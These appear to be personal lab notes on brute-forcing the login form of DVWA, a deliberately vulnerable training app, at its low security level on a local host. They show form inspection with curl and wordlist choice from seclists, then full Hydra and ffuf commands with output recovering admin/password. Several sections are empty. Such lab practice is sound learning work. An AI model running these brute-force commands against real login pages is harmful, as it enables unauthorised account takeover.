- [Low](#low)
    - [seclists](#seclists)
    - [Burp Intruder](#burp-intruder)
    - [Hydra](#hydra)
    - [patator](#patator)
    - [ffuf](#ffuf)

-------------------------------------------

# [Low](#low-1)

## 
```sh
$ curl -sL "$t/vulnerabilities/brute/" | html2text | grep .       
[dvwa/images/login_logo.png]
 Username [username            ]
Password [********************]
[Login]
Damn_Vulnerable_Web_Application_(DVWA)

$ cookie='Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low'

$ curl -sL "$t/vulnerabilities/brute/" -H $cookie | html2text | grep .
[Damn Vulnerable Web Application]
    * Home
    * Instructions
    * Setup_/_Reset_DB
    * Brute_Force
    * Command_Injection
    * CSRF
    * File_Inclusion
    * File_Upload
    * Insecure_CAPTCHA
    * SQL_Injection
    * SQL_Injection_(Blind)
    * Weak_Session_IDs
    * XSS_(DOM)
    * XSS_(Reflected)
    * XSS_(Stored)
    * CSP_Bypass
    * JavaScript
    * DVWA_Security
    * PHP_Info
    * About
    * Logout
****** Vulnerability: Brute Force ******
***** Login *****
Username:
[username            ]
Password:
[********************]
[Login]
***** More Information *****
    * https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)
    * http://www.symantec.com/connect/articles/password-crackers-ensuring-
      security-your-password
    * http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-
      windows.html
">
">
Username: admin
Security Level: low
PHPIDS: disabled
Damn Vulnerable Web Application (DVWA) v1.10 *Development*
```

## [seclists](#seclists-1)
```sh
$ realpath top-usernames-shortlist.txt 
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

$ head -3 /usr/share/seclists/Usernames/top-usernames-shortlist.txt > usernames.txt

$ realpath best15.txt
/usr/share/seclists/Passwords/Common-Credentials/best15.txt
```

## [Burp Intruder](#burp-intruder-1)
```sh
Cluster bomb
```

## 
```sh
$ curl -sL "$t/vulnerabilities/brute/" | grep -Pzo '<form[\s\S]*?</form>' | html2text | grep .
 Username [username            ]
Password [********************]
[Login]

$ curl -sL "$t/vulnerabilities/brute/" -H $cookie | grep -Pzo '<form[\s\S]*?</form>'
<form action="#" method="GET">
                        Username:<br />
                        <input type="text" name="username"><br />
                        Password:<br />
                        <input type="password" AUTOCOMPLETE="off" name="password"><br />
                        <br />
                        <input type="submit" value="Login" name="Login">

                </form>
```


## [Hydra](#hydra-1)
Hydra is super sensive to sequence
Make sure host first before service (http-get-form), followed by 3 compulsory parameters seperated by colon (:)
```sh
$ hydra -L usernames.txt -P best15.txt 127.0.0.1 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low:incorrect'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 12:51:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 45 login tries (l:3/p:15), ~3 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low:incorrect
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 12:51:52
```

## [patator](#patator-1)
```sh

```

## [ffuf](#ffuf-1)
```sh
$ ffuf -H 'Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low' -u 'http://tvm/vulnerabilities/brute/?username=USER&password=PASS&Login=Login#' -w usernames.txt:USER -w best15.txt:PASS -fr 'incorrect'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://tvm/vulnerabilities/brute/?username=USER&password=PASS&Login=Login#
 :: Wordlist         : USER: /xyz/note/VulnLabs/DVWA/Vuln/usernames.txt
 :: Wordlist         : PASS: /xyz/note/VulnLabs/DVWA/Vuln/best15.txt
 :: Header           : Cookie: PHPSESSID=26gh97rtmqv33ggsv4e1o64cl1; security=low
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Regexp: incorrect
________________________________________________

[Status: 200, Size: 4413, Words: 179, Lines: 109, Duration: 6ms]
    * PASS: password
    * USER: admin

:: Progress: [45/45] :: Job [1/1] :: 9 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

## 
```sh

```

## 
```sh

```

## 
```sh

```

# References

